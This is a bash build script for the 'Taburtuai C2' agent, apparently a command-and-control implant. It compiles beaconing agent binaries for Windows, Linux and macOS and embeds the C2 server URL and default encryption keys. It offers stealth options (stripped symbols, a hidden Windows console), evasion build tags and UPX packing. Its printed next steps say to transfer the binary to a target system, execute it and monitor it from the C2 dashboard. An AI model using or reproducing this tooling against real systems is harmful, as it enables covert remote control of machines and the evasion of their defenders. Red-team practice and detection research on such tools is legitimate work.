#!/bin/bash

# Enhanced Agent Build Script for Taburtuai C2
set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Defaults
DEFAULT_SERVER_URL="http://127.0.0.1:8080"
DEFAULT_KEY="SpookyOrcaC2AES1"
DEFAULT_SECONDARY_KEY="TaburtuaiSecondary"
DEFAULT_INTERVAL="30"
DEFAULT_JITTER="0.3"

# Paths
BUILD_DIR="./bin"
AGENT_DIR="./agent"
ROOT_DIR="$(pwd)"

print_status() { echo -e "${BLUE}[INFO]${NC} $1"; }
print_success() { echo -e "${GREEN}[SUCCESS]${NC} $1"; }
print_warning() { echo -e "${YELLOW}[WARNING]${NC} $1"; }
print_error() { echo -e "${RED}[ERROR]${NC} $1"; }

show_usage() {
    cat << 'USAGE_EOF'
Enhanced Agent Build Script for Taburtuai C2

Usage: ./build_agent.sh [OPTIONS]

Options:
    -s, --server URL        C2 server URL (default: http://127.0.0.1:8080)
    -k, --key KEY          Primary encryption key (default: SpookyOrcaC2AES1)
    -2, --secondary KEY    Secondary encryption key (default: TaburtuaiSecondary)
    -i, --interval SEC     Beacon interval in seconds (default: 30)
    -j, --jitter FLOAT     Jitter factor 0.0-1.0 (default: 0.3)
    -o, --os TARGET        Target OS: windows, linux, darwin (default: current)
    -a, --arch ARCH        Target architecture: amd64, 386, arm64 (default: amd64)
    -n, --name NAME        Output filename (default: auto-generated)
    -S, --stealth          Enable stealth compilation options
    -c, --compress         Compress final binary with UPX
    -e, --evasion          Enable evasion techniques
    -d, --debug            Enable debug mode (disable stealth)
    -h, --help             Show this help message

Examples:
    # Build basic agent
    ./build_agent.sh

    # Build for Windows with custom server
    ./build_agent.sh -s http://192.168.1.100:8080 -o windows

    # Build with stealth and evasion options
    ./build_agent.sh -S -e -c -o windows

    # Build debug version
    ./build_agent.sh -d -o linux

Build Requirements:
    - Go 1.19+ installed
    - UPX (optional, for compression)
    - Internet connection (for Go modules)
USAGE_EOF
}

check_dependencies() {
    print_status "Checking build dependencies..."
    
    # Check Go
    if ! command -v go >/dev/null 2>&1; then
        print_error "Go is not installed or not in PATH"
        print_error "Please install Go 1.19+ from https://golang.org/dl/"
        exit 1
    fi
    
    # Check Go version
    GO_VERSION=$(go version | cut -d' ' -f3 | sed 's/go//')
    GO_MAJOR=$(echo $GO_VERSION | cut -d'.' -f1)
    GO_MINOR=$(echo $GO_VERSION | cut -d'.' -f2)
    
    if [ "$GO_MAJOR" -lt "1" ] || ([ "$GO_MAJOR" -eq "1" ] && [ "$GO_MINOR" -lt "19" ]); then
        print_warning "Go version $GO_VERSION detected. Recommended: 1.19+"
    else
        print_success "Go version $GO_VERSION detected"
    fi
    
    # Check UPX (optional)
    if [ "$COMPRESS" = true ]; then
        if ! command -v upx >/dev/null 2>&1; then
            print_warning "UPX not found. Compression will be skipped"
            COMPRESS=false
        else
            print_success "UPX found for binary compression"
        fi
    fi
    
    # Check agent directory
    if [ ! -d "$AGENT_DIR" ]; then
        print_error "Agent directory not found: $AGENT_DIR"
        print_error "Please run this script from the project root directory"
        exit 1
    fi
    
    # Check main go.mod exists
    if [ ! -f "go.mod" ]; then
        print_error "Main go.mod not found. Please run from project root directory"
        exit 1
    fi
    
    # Check required files
    REQUIRED_FILES=("agent/main.go" "agent/agent.go" "agent/commands.go" "shared/crypto/crypto.go" "shared/types/types.go")
    for file in "${REQUIRED_FILES[@]}"; do
        if [ ! -f "$file" ]; then
            print_error "Required file not found: $file"
            exit 1
        fi
    done
    
    print_success "All dependencies check passed"
}

setup_go_modules() {
    print_status "Setting up Go modules..."
    
    # Check if we're in the main module
    if [ ! -f "go.mod" ]; then
        print_error "Main go.mod not found. Please run from project root."
        exit 1
    fi
    
    # Ensure we have the shared modules
    if [ ! -d "shared" ]; then
        print_error "Shared directory not found. Please ensure project structure is correct."
        exit 1
    fi
    
    # Download dependencies for main module
    print_status "Downloading Go dependencies..."
    if ! go mod tidy; then
        print_error "Failed to download Go dependencies"
        exit 1
    fi
    
    print_success "Go modules setup completed"
}

prepare_source() {
    print_status "Preparing agent source code..."
    
    # Create backup of original main.go
    cp "$AGENT_DIR/main.go" "$AGENT_DIR/main.go.bak"
    
    # Replace configuration values in main.go
    if [[ "$OSTYPE" == "darwin"* ]]; then
        # macOS sed
        sed -i '' \
            -e "s|defaultServerURL    = \".*\"|defaultServerURL    = \"$SERVER_URL\"|g" \
            -e "s|defaultKey          = \".*\"|defaultKey          = \"$KEY\"|g" \
            -e "s|defaultSecondaryKey = \".*\"|defaultSecondaryKey = \"$SECONDARY_KEY\"|g" \
            -e "s|defaultInterval     = \".*\"|defaultInterval     = \"$INTERVAL\"|g" \
            -e "s|defaultJitter       = \".*\"|defaultJitter       = \"$JITTER\"|g" \
            "$AGENT_DIR/main.go"
    else
        # Linux sed
        sed -i \
            -e "s|defaultServerURL    = \".*\"|defaultServerURL    = \"$SERVER_URL\"|g" \
            -e "s|defaultKey          = \".*\"|defaultKey          = \"$KEY\"|g" \
            -e "s|defaultSecondaryKey = \".*\"|defaultSecondaryKey = \"$SECONDARY_KEY\"|g" \
            -e "s|defaultInterval     = \".*\"|defaultInterval     = \"$INTERVAL\"|g" \
            -e "s|defaultJitter       = \".*\"|defaultJitter       = \"$JITTER\"|g" \
            "$AGENT_DIR/main.go"
    fi
    
    # Add evasion integration if enabled
    if [ "$EVASION" = true ]; then
        print_status "Enabling evasion techniques..."
        # This would modify the agent to include evasion checks
        # For now, we'll add a build tag
        BUILD_TAGS="$BUILD_TAGS,evasion"
    fi
    
    print_success "Source code prepared"
}

build_agent() {
    print_status "Building enhanced agent..."
    
    # Generate output filename
    if [ -z "$OUTPUT_NAME" ]; then
        OUTPUT_NAME="taburtuai_agent_${TARGET_OS}_${TARGET_ARCH}"
        if [ "$TARGET_OS" = "windows" ]; then
            OUTPUT_NAME="${OUTPUT_NAME}.exe"
        fi
        
        # Add suffix for special builds
        if [ "$STEALTH" = true ]; then
            OUTPUT_NAME="${OUTPUT_NAME%.*}_stealth"
            if [ "$TARGET_OS" = "windows" ]; then
                OUTPUT_NAME="${OUTPUT_NAME}.exe"
            fi
        fi
        
        if [ "$DEBUG" = true ]; then
            OUTPUT_NAME="${OUTPUT_NAME%.*}_debug"
            if [ "$TARGET_OS" = "windows" ]; then
                OUTPUT_NAME="${OUTPUT_NAME}.exe"
            fi
        fi
    fi
    
    # Set build flags
    local ldflags=""
    local build_tags=""
    
    if [ "$STEALTH" = true ] && [ "$DEBUG" = false ]; then
        ldflags="-s -w"
        if [ "$TARGET_OS" = "windows" ]; then
            ldflags="$ldflags -H windowsgui"
        fi
        build_tags="release"
        print_status "Stealth mode enabled (stripped symbols, no GUI)"
    fi
    
    if [ "$DEBUG" = true ]; then
        ldflags="-X 'main.DebugMode=true'"
        build_tags="debug"
        print_status "Debug mode enabled"
    fi
    
    if [ "$EVASION" = true ]; then
        if [ -n "$build_tags" ]; then
            build_tags="$build_tags,evasion"
        else
            build_tags="evasion"
        fi
        print_status "Evasion techniques enabled"
    fi
    
    # Set environment variables
    export GOOS="$TARGET_OS"
    export GOARCH="$TARGET_ARCH"
    export CGO_ENABLED=0
    
    print_status "Building for $TARGET_OS/$TARGET_ARCH..."
    print_status "Output: $BUILD_DIR/$OUTPUT_NAME"
    
    # Create build directory
    mkdir -p "$BUILD_DIR"
    
    # Build command
    local build_cmd="go build"
    
    if [ -n "$build_tags" ]; then
        build_cmd="$build_cmd -tags $build_tags"
    fi
    
    if [ -n "$ldflags" ]; then
        build_cmd="$build_cmd -ldflags \"$ldflags\""
    fi
    
    build_cmd="$build_cmd -o \"$ROOT_DIR/$BUILD_DIR/$OUTPUT_NAME\" ./agent"
    
    # Execute build from root directory (not agent directory)
    print_status "Executing: $build_cmd"
    
    if eval $build_cmd; then
        print_success "Agent built successfully: $BUILD_DIR/$OUTPUT_NAME"
    else
        print_error "Build failed"
        cleanup_source
        exit 1
    fi
    
    # Show file info
    if [ -f "$BUILD_DIR/$OUTPUT_NAME" ]; then
        local file_size=$(du -h "$BUILD_DIR/$OUTPUT_NAME" | cut -f1)
        print_status "Binary size: $file_size"
    fi
}

compress_binary() {
    if [ "$COMPRESS" = true ]; then
        print_status "Compressing binary with UPX..."
        
        if command -v upx >/dev/null 2>&1; then
            local original_size=$(du -h "$BUILD_DIR/$OUTPUT_NAME" | cut -f1)
            
            if upx --best --lzma "$BUILD_DIR/$OUTPUT_NAME" 2>/dev/null; then
                local compressed_size=$(du -h "$BUILD_DIR/$OUTPUT_NAME" | cut -f1)
                print_success "Binary compressed: $original_size → $compressed_size"
            else
                print_warning "UPX compression failed, but binary is still usable"
            fi
        else
            print_warning "UPX not found, skipping compression"
        fi
    fi
}

cleanup_source() {
    print_status "Cleaning up temporary files..."
    
    # Restore original main.go
    if [ -f "$AGENT_DIR/main.go.bak" ]; then
        mv "$AGENT_DIR/main.go.bak" "$AGENT_DIR/main.go"
    fi
    
    print_success "Cleanup completed"
}

generate_config_info() {
    local config_file="$BUILD_DIR/${OUTPUT_NAME%.*}_config.txt"
    
    cat > "$config_file" << EOF
Taburtuai C2 Agent Build Configuration
=====================================

Build Information:
  Agent Binary: $OUTPUT_NAME
  Target OS: $TARGET_OS
  Architecture: $TARGET_ARCH
  Build Date: $(date)
  Build Host: $(hostname)

Configuration:
  Server URL: $SERVER_URL
  Beacon Interval: ${INTERVAL}s
  Jitter Factor: $JITTER
  Primary Key: $KEY
  Secondary Key: $SECONDARY_KEY

Build Options:
  Stealth Mode: $STEALTH
  Debug Mode: $DEBUG
  Evasion Enabled: $EVASION
  Compression: $COMPRESS

Usage Instructions:
  1. Transfer the agent binary to target system
  2. Execute the binary (no arguments needed)
  3. Agent will connect to: $SERVER_URL
  4. Monitor connections via C2 dashboard or CLI

Security Notes:
  - Agent uses AES-256-GCM encryption
  - All communications are encrypted
  - Agent self-destructs on detection (if evasion enabled)
EOF

    print_success "Configuration saved to: $config_file"
}

parse_args() {
    # Set defaults
    SERVER_URL="$DEFAULT_SERVER_URL"
    KEY="$DEFAULT_KEY"
    SECONDARY_KEY="$DEFAULT_SECONDARY_KEY"
    INTERVAL="$DEFAULT_INTERVAL"
    JITTER="$DEFAULT_JITTER"
    TARGET_OS=$(go env GOOS 2>/dev/null || echo "linux")
    TARGET_ARCH="amd64"
    OUTPUT_NAME=""
    STEALTH=false
    COMPRESS=false
    EVASION=false
    DEBUG=false
    
    while [[ $# -gt 0 ]]; do
        case $1 in
            -s|--server)
                SERVER_URL="$2"
                shift 2
                ;;
            -k|--key)
                KEY="$2"
                shift 2
                ;;
            -2|--secondary)
                SECONDARY_KEY="$2"
                shift 2
                ;;
            -i|--interval)
                INTERVAL="$2"
                shift 2
                ;;
            -j|--jitter)
                JITTER="$2"
                shift 2
                ;;
            -o|--os)
                TARGET_OS="$2"
                shift 2
                ;;
            -a|--arch)
                TARGET_ARCH="$2"
                shift 2
                ;;
            -n|--name)
                OUTPUT_NAME="$2"
                shift 2
                ;;
            -S|--stealth)
                STEALTH=true
                shift
                ;;
            -c|--compress)
                COMPRESS=true
                shift
                ;;
            -e|--evasion)
                EVASION=true
                shift
                ;;
            -d|--debug)
                DEBUG=true
                STEALTH=false  # Debug mode disables stealth
                shift
                ;;
            -h|--help)
                show_usage
                exit 0
                ;;
            *)
                print_error "Unknown option: $1"
                show_usage
                exit 1
                ;;
        esac
    done
    
    # Validate arguments
    case $TARGET_OS in
        windows|linux|darwin)
            ;;
        *)
            print_error "Unsupported target OS: $TARGET_OS"
            print_error "Supported: windows, linux, darwin"
            exit 1
            ;;
    esac
    
    case $TARGET_ARCH in
        amd64|386|arm64)
            ;;
        *)
            print_error "Unsupported architecture: $TARGET_ARCH"
            print_error "Supported: amd64, 386, arm64"
            exit 1
            ;;
    esac
    
    # Validate interval
    if ! [[ "$INTERVAL" =~ ^[0-9]+$ ]] || [ "$INTERVAL" -lt 1 ] || [ "$INTERVAL" -gt 3600 ]; then
        print_error "Invalid interval: $INTERVAL (must be 1-3600 seconds)"
        exit 1
    fi
    
    # Validate jitter
    if ! [[ "$JITTER" =~ ^[0-9]*\.?[0-9]+$ ]] || (( $(echo "$JITTER < 0" | bc -l) )) || (( $(echo "$JITTER > 1" | bc -l) )); then
        print_error "Invalid jitter: $JITTER (must be 0.0-1.0)"
        exit 1
    fi
}

show_build_summary() {
    echo ""
    echo -e "${BLUE}╔══════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║                     Build Summary                                ║${NC}"
    echo -e "${BLUE}╚══════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${GREEN}✓ Agent binary built successfully${NC}"
    echo -e "  Output: ${YELLOW}$BUILD_DIR/$OUTPUT_NAME${NC}"
    echo -e "  Target: ${CYAN}$TARGET_OS/$TARGET_ARCH${NC}"
    echo -e "  Server: ${CYAN}$SERVER_URL${NC}"
    echo ""
    echo -e "${BLUE}Configuration:${NC}"
    echo -e "  Beacon Interval: ${CYAN}${INTERVAL}s${NC}"
    echo -e "  Jitter Factor: ${CYAN}$JITTER${NC}"
    echo -e "  Stealth Mode: ${CYAN}$STEALTH${NC}"
    echo -e "  Debug Mode: ${CYAN}$DEBUG${NC}"
    echo -e "  Evasion: ${CYAN}$EVASION${NC}"
    echo -e "  Compression: ${CYAN}$COMPRESS${NC}"
    echo ""
    echo -e "${BLUE}Next Steps:${NC}"
    echo -e "  1. Transfer ${YELLOW}$BUILD_DIR/$OUTPUT_NAME${NC} to target system"
    echo -e "  2. Execute the agent (no arguments needed)"
    echo -e "  3. Monitor via: ${CYAN}taburtuai-cli agents list${NC}"
    echo -e "  4. View config: ${CYAN}cat $BUILD_DIR/${OUTPUT_NAME%.*}_config.txt${NC}"
    echo ""
}

main() {
    echo -e "${BLUE}"
    cat << 'HEADER_EOF'
╔══════════════════════════════════════════════════════════════════╗
║               Enhanced Agent Build Script v3.0                   ║
║                    Taburtuai C2 - Modular                        ║
╚══════════════════════════════════════════════════════════════════╝
HEADER_EOF
    echo -e "${NC}"
    
    parse_args "$@"
    check_dependencies
    setup_go_modules
    prepare_source
    
    # Start build process
    echo ""
    print_status "Starting build process..."
    echo -e "  Target: ${CYAN}$TARGET_OS/$TARGET_ARCH${NC}"
    echo -e "  Server: ${CYAN}$SERVER_URL${NC}"
    echo -e "  Output: ${CYAN}$BUILD_DIR/$OUTPUT_NAME${NC}"
    echo ""
    
    build_agent
    compress_binary
    generate_config_info
    cleanup_source
    
    show_build_summary
}

# Trap to ensure cleanup on exit
trap cleanup_source EXIT

main "$@"